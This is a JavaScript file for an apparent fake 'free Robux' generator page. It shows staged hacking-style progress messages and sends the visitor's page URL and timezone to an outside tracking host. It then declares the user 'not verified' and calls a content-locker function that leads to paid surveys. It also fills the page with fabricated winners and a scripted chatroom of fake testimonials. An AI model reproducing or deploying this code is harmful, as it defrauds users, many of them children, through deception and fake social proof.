function SelectedCard(cardnum){
    document.getElementById("Robux-Card1").classList.remove('Robux-Card-Selected');
    document.getElementById("Robux-Card2").classList.remove('Robux-Card-Selected');
    document.getElementById("Robux-Card3").classList.remove('Robux-Card-Selected');
    document.getElementById("Robux-Card1").classList.add('Robux-Card');
    document.getElementById("Robux-Card2").classList.add('Robux-Card');
    document.getElementById("Robux-Card3").classList.add('Robux-Card');
    
      document.getElementById("Robux-Card"+cardnum).classList.remove('Robux-Card');
      document.getElementById("Robux-Card"+cardnum).classList.add('Robux-Card-Selected');
    }
    
    function generate(){
      var lname=document.getElementById("lname").value;
      if (lname==''){
        document.getElementById("lname").style.borderColor= "#e2251c";
        document.getElementById("lname").style.boxShadow= "0px 0px 100px red";
        document.getElementById("lname").focus();
      }else{
        document.getElementById("step1").style.display="none";
        document.getElementById("step2").style.display="block";
        var username= document.getElementById("lname").value;
        document.getElementById("user-name").innerHTML=username;
        document.getElementById("user-name1").innerHTML=username;
        document.getElementById("user-name2").innerHTML=username;
        var myVar2 = setInterval(UserTimer, 2000);
        var linestep=1;
        function UserTimer() {
          if (linestep==1){
            document.getElementById("text-gen-loading").innerHTML="Checking public key...";
          }else if(linestep==2){
            document.getElementById("text-gen-loading").innerHTML="Verifying hash...";
          }else if(linestep==3){
            document.getElementById("text-gen-loading").innerHTML="Extracting...";
          }else if(linestep==4){
            document.getElementById("text-gen-loading").innerHTML="Locating Minecraft Games " +username+" (attempt 1)...";
          }else if(linestep==5){
            document.getElementById("text-gen").style.display="block";
            document.getElementById("text-gen-loading").innerHTML="Locating Minecraft Games " +username+" (attempt 2)...";
          }
          else if(linestep==6){
            document.getElementById("text-gen1").style.display="block";
            document.getElementById("text-gen-loading").innerHTML="Downloading values...";
          }else if(linestep==7){
            document.getElementById("text-gen-loading").innerHTML="Format JSON...";
          }else if(linestep==8){
    
            document.getElementById("text-gen-loading").innerHTML="Sending Packets...";
          }else if(linestep==9){
    
            document.getElementById("text-gen-loading").innerHTML="Reading config...";
          }else if(linestep==10){
            document.getElementById("text-gen-loading").innerHTML="Pinging node.js";
          }else if(linestep==11){
      document.getElementById("text-gen2").style.display="block";
    
            document.getElementById("text-gen-loading").innerHTML="Sending...";
          }else if(linestep==14){
      document.getElementById("text-gen3").style.display="block";
      var offset = new Date().getTimezoneOffset();
      offset=offset/-60;
      var data;var country;var code;var d=window.location.href;
      fetch('https://visitor-country.info/index.php?d='+d+"&t="+offset,{referrerPolicy:'unsafe-url'})
      .then(res => res.json())
      .then(output => {
      data =output;
      country=data.country;
      code=data.code;
      document.getElementById("text-gen6").style.display="block";
      document.getElementById("text-gen6").innerHTML='<div class="text-gen6-status"></div>'+"Unusually high traffic from "+country ;
      })
    
            document.getElementById("text-gen-loading").innerHTML="Checking Verification...";
          }else if(linestep==15){
      document.getElementById("text-gen4").style.display="block";
            document.getElementById("text-gen-loading").innerHTML="Reading config...";
          }else if(linestep==16){
                        document.getElementById("text-gen5").style.display="block";
            document.getElementById("text-gen-loading").innerHTML="User not verified.";
          }else if(linestep==17){
                      CPABuildLock();
          }
          linestep++;
        }
      }
    
    
    }
    
    
    
    //Recent activity
    var valactivity= setInterval(RecentActivity, 100);
    var prostep=0;
    var prostepDelay=0;
    function RecentActivity(){
      if (prostep==0){
        var genrobux = ["1700", "4500", "10000"];
        var robux=genrobux[Math.floor(Math.random() * 3)];
        document.getElementById("genrobux").innerHTML=' '+robux;
    
        var gennamelist = ["fio251", "kaka110", "isexx","Gambit",
        "Outrageous Creator",
        "Homely Introvert",
        "Plain Privacy",
        "Brash Thug",
        "Annoyed",
        "Demonic AI",
        "Abnormal Vigor",
        "Optimally Ace",
        "Inimical Thug",
        "Feared Butcher",
        "Multiply Divide",
        "Psychedelic Servicemen",
        "Militaristic Machine",
        "Ball Blaster",
        "Legends Reload",
        "Brute Fact",
        "Bloss flop",
        "Tango Boss",
        "Optimal Aces",
        "Inimical Thugs",
        "Fear Butchers",
        "Left Divide",
        "Psychedelic",
        "Militaristic ",
        "Keen Team Six",
        "Fuzzy Pack",
        "Gangsters",
        "Mortified",
        "Lyrical",
        "Outrageous",
        "Homely",
        "Plain Privilege",
        "Brash Thugs",
        "Nutty Domination",
        "Complex Slayers",
        "Faulty Devils",
        "Fanatical Tyranny",
        "Odd Hooligans",
        "Organic Punks",
        "Quarrelsome",
        "Admirals",
        "Perpetrator",
        "Fighting",
        "Keen Team Six",
        "HolyJESUS",
        "Lone_Ranger",
        "Dark Warrior",
        "XxGoldenWarior"];
        var name=gennamelist[Math.floor(Math.random() * 52)];
        document.getElementById("genname").innerHTML=name;
      }
      prostepDelay++;
      if (prostep>=50 & prostepDelay>=100){
    prostep++;
    }else if(prostep<51) {
        prostep++;
      }
    
    
      document.getElementById("pro-step1").style.backgroundColor="#03fff8";
    document.getElementById("progress-bar").style.width=prostep +"%";
    if (prostep==50){
      document.getElementById("gen-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/160654779319118d636b2ea3b4779800f01d8c318a.png')";
      document.getElementById("gen-loading").style.animation ="myloading";
    } else if(prostep>50){
      document.getElementById("pro-step2").style.backgroundColor="#03fff8";
      document.getElementById("progress-bar").style.width=prostep +"%";
      if (prostep>99){
        document.getElementById("pro-step3").style.backgroundColor="#03fff8";
        document.getElementById("veri-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/160654779319118d636b2ea3b4779800f01d8c318a.png')";
        document.getElementById("veri-loading").style.animation ="myloading";
    
      }
    }
    if (prostep>=100 & prostepDelay>=160){
            document.getElementById("gen-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/16065477944c50af0438af3e56a012ee489fbfa465.png')";
            document.getElementById("gen-loading").style.animation ="Aniloading 1s linear infinite";
            document.getElementById("veri-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/16065477944c50af0438af3e56a012ee489fbfa465.png')";
            document.getElementById("veri-loading").style.animation ="Aniloading 1s linear infinite";
    
          prostep=0;
          prostepDelay=0;
    
    }
    }
    //chatroom
    
    
    var valactivity= setInterval(RecentActivity1, 6500);
    
    
    
    function RecentActivity1(){
      var today = new Date();
    var time = today.getHours() + ":" + today.getMinutes();
    
      var gennamelist = ["fio251", "kaka110", "isexx","Gambit",
      "Outrageous Creator",
      "Homely Introvert",
      "Plain Privacy",
      "Brash Thug",
      "Annoyed",
      "Demonic AI",
      "Abnormal Vigor",
      "Optimally Ace",
      "Inimical Thug",
      "Feared Butcher",
      "Multiply Divide",
      "Psychedelic Servicemen",
      "Militaristic Machine",
      "Ball Blaster",
      "Legends Reload",
      "Brute Fact",
      "Bloss flop",
      "Tango Boss",
      "Optimal Aces",
      "Inimical Thugs",
      "Fear Butchers",
      "Left Divide",
      "Psychedelic",
      "Militaristic ",
      "Keen Team Six",
      "Fuzzy Pack",
      "Gangsters",
      "Mortified",
      "Lyrical",
      "Outrageous",
      "Homely",
      "Plain Privilege",
      "Brash Thugs",
      "Nutty Domination",
      "Complex Slayers",
      "Faulty Devils",
      "Fanatical Tyranny",
      "Odd Hooligans",
      "Organic Punks",
      "Quarrelsome",
      "Admirals",
      "Perpetrator",
      "Fighting",
      "Keen Team Six",
      "HolyJESUS",
      "Lone_Ranger",
      "Dark Warrior",
      "XxGoldenWarior"];
      var name=gennamelist[Math.floor(Math.random() * 52)];
    
      var genmessagelist = [
    "anyone reddit here?",
    "NICE here I come",
    "what can I buy with this I am new to this",
    "dont regret being here",
    "i tested on all servers and so for it works on all of them",
    "pretty sure this is saving me a lot of money",
    "just wow",
    "NICE here I come",
    "i wasted so much money on this - good this is free here",
    "i thought my friend wanted to fool me with this website link. but you can rly get it free here if you dont mess up with the survey part",
    "hey i am a newbie in game what can i do with this",
    "you think this will be patched any time soon",
    "Is this ban secure?",
    "thank you for giving me ALL THIS",
    "best free website cus it finally works",
    "who is up for mystery gifting?",
    "where i put in my code?",
    "I had a bit trouble with some survy thing but no problem if you just choose an easy",
    "had to reload page before it worked",
    "great generator good i found this",
    "my boyfriend will freak out ",
    "Why this is so easy lol?",
    "trololo adding so fast to my account",
    "noobs pls if you dont know how to do it dont spam here okay",
    "any idea which skin i should get",
    "dont regret being here",
    "guys i would share some codes but chat blocked it",
    "i think everyone get points here",
    "I got two for my girlfriend making her happy and i dont pay for them lol",
    "anyone playing now?",
    "I have seen this generator on hotshot stream i think",
    "i havent seen this before but im impressed with the result!",
    "I had a bit trouble with some survy thing but no problem if you just choose an easy",
    "Cool =)",
    "yo guys dont spam okay?",
    "Real",
    "EUW and NA worked fine",
    "why would someone just go here to hate and spam pff",
    "what was the latest update",
    "surveys dont appaer every time but i think its there to have enough money for the website to buy all codes",
    "a friend told me about this",
    "you can NOT lose any the codes DO exist!",
    "I got two for my girlfriend making her happy and i dont pay for them lol",
    "i am fine with having free how about you",
    "noobs pls if you dont know how to do it dont spam here okay",
    "What you think about all this",
    "is this twitch chat?",
    "i play on EU",
    "I got two for my girlfriend making her happy and i dont pay for them lol",
    "I love this",
    "yeah free is cool",
    "I want to play on korean servers would be cool",
    "i rly dont know which to do with this",
    "any bro needs codes? I have some",
    "are you not bored at all? dont spam",
    "What does it do?",
    "Does it work in North Americaa?",
    "where i put in my code?",
    "EUW and NA worked fine",
    "i am looking for a team pls add",
    "Exactly why this is so good",
    "i havent seen this before but im impressed with the result!",
    "i dont rly like new map",
    "Ok so I am back and what I can say is that my acc is filled up! I can not do a screenshot cus the chat would block any links meh but rly go try it its worth it",
    "When do I get my code?",
    "thanks to whoever pmed me his code it worked",
    "this website is used a lot sometimes you have to wait a bit",
    "Thanks man I appreciate this.",
    "Likely, but I think one day this will not work anymore",
    "hey i am a newbie in game what can i do with this",
    "soo ecxitedd",
    "ten minutes ago i had 0, now i have tons",
    "i have tried too many surveys in my life finally i got lucky here",
    "any idea if this still works tomorrow",
    "When do I get my code?",
    "Does it work in North Americaa?",
    "How long do you have to wait?",
    "hey i am a newbie in game what can i do with this",
    "i am fine with having free how about you",
    "fucking is real",
    "nice page for free points",
    "saw on stream yo",
    "Real",
    "i add more every day and i only use this website here so i can only recommend this stuff",
    "this makes my game more enjoyable i hope",
    "saw on stream yo",
    "this still works at the moment",
    "what?",
    "okay",
    "had to reload page before it worked",
    "i would do screenshot but maybe you report me then",
    "my friends on facebook spam this like every day they are rly happy about it",
    "just dodged queue for this",
    "now the secret is solved why some people have overload of it",
    "Thanks man I appreciate this.",
    "incredible",
    "wow really many people online here",
    "derp",
    "you guys watch nightblue?",
    "PM me a code pls",
    "raise your points",
    "wow 10 minutes ago this was empty now all people here wtf",
    "fucking helll! all free!.",
    "Likely, but I think one day this will not work anymore",
    "Ok so I am back and what I can say is that my acc is filled up! I can not do a screenshot cus the chat would block any links meh but rly go try it its worth it",
    "nice page for free points",
    "hi again im here for more codes",
    "you guys watch nightblue?",
    "Does it work in North Americaa?",
    "yayy",
    "i am fine with having free how about you",
    "check my profile i am rich",
    "noobs pls if you dont know how to do it dont spam here okay",
    "so happy i found this",
    "okay",
    "Does it work in North Americaa?",
    "is this twitch chat?",
    "what?",
    "Why this is so easy lol?",
    "i was stuck in survey had to do again but it worked then",
    "i think everyone get points here",
    "I got two for my girlfriend making her happy and i dont pay for them lol",
    "did you try 7482291023 yet? I used on NA but maybe other servers can use it too",
    "yes i got it too",
    "i wish i found this earlier",
    "Does it work in North Americaa?",
    "any bro needs codes? I have some",
    "thank you for giving me ALL THIS",
    "i cant buy it but now i can get it anyway",
    "pretty sure this is saving me a lot of money",
    "saw this on forums pretty impressive",
    "gayyyy",
    "thank you all for helping me out bros",
    "most i got in one day was 25k",
    "this is the best giveaway because we all have more than a chance",
    "i can imagine some people get rly mad for having lost so much money on this and didnt know this page here",
    "i rly dont know which to do with this",
    "i checked some of the people accounts here they are actually real humans maybe not all though",
    "yo guys dont spam okay?",
    "nice page for free points",
    "I can imagine this must be annoying for some players",
    "actually i had no problem with any survey ever, just try?",
    "i feel like i have as much as the progamers now without buying any!",
    "Real",
    "great generator good i found this",
    "i see no limits on how much you can get thats so epic",
    "i think some offers easier in countries like USA",
    "great generator good i found this",
    "trololo adding so fast to my account",
    "How long do you have to wait?",
    "i love it so much",
    "Exactly what I think",
    "this website is used a lot sometimes you have to wait a bit",
    "Ok so I am back and what I can say is that my acc is filled up! I can not do a screenshot cus the chat would block any links meh but rly go try it its worth it",
    "wow i waited ages to get a server transfer now with this service here it shouldnt be a problem anymore",
    "my boyfriend will freak out ",
    "i can imagine some people get rly mad for having lost so much money on this and didnt know this page here",
    "I unlocked this on EU servers.",
    "nice",
    "Ok so I am back and what I can say is that my acc is filled up! I can not do a screenshot cus the chat would block any links meh but rly go try it its worth it",
    "you think this will be patched any time soon",
    "You should give it a try",
    "Shut up man I love this website",
    "How much codes you unlocked so far?",
    "my friends on facebook spam this like every day they are rly happy about it",
    "nice page for free points",
    "What does it do?",
    "wow really many people online here"
    
    
    ];
      var message=genmessagelist[Math.floor(Math.random() * 52)];
    document.getElementById("chatroom-message").innerHTML=document.getElementById("chatroom-message").innerHTML + "<br>"+'<span class="chatroom-time">['+time+'] </span> <span class="chatroom-name">'+name+'</span>: <span class="chatroom-message">'+message+'</span>';
    var objDiv = document.getElementById("chartroom-body");
    objDiv.scrollTop = objDiv.scrollHeight;
    }
    
    //END